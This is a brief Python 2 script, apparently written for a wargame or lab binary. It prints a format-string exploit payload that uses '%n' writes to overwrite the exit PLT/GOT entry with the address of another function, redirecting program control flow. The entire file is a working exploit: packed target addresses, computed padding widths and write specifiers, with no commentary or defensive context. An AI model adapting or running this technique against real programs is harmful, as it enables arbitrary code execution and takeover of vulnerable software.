#!/usr/bin/python

import struct

FT_O = 0x80484a4
PLT_EXIT = 0x8049838

FT_O_DECI = 134513828

FT_O_P1_DECI = 33956 #84a4-8
FT_O_P2_DECI = 33632

def pad(s):
    return s+"X"*(512-len(s))

EXPLOIT = struct.pack("I", PLT_EXIT)
EXPLOIT += struct.pack("I", PLT_EXIT+2)
EXPLOIT += "%4$33948x"
EXPLOIT += "%4$n"
EXPLOIT += "%33632x"
EXPLOIT += "%5$n"

print pad(EXPLOIT)
